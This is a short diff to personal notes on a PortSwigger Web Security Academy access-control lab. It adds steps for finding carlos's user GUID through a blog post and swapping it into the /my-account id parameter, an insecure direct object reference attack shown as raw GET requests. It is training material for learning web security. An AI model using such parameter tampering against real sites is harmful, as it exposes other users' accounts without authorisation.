@@ -23,3 +23,14 @@ change ID parameter as carlos
 ```
 GET /my-account?id=carlos
 ```
+url:https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
+Find a blog post by carlos.
+Click on carlos and observe that the URL contains his
+```
+GET /my-account?id=98ec5ea0-b562-4211-a146-7a44ba6c2770
+GET /blogs?userId=80bd0023-fd27-4afd-b42a-161256c48970
+```
+uid and id parameter converts as login another users, both id and userid is ApiKey
+```
+GET /my-account?id=80bd0023-fd27-4afd-b42a-161256c48970
+```
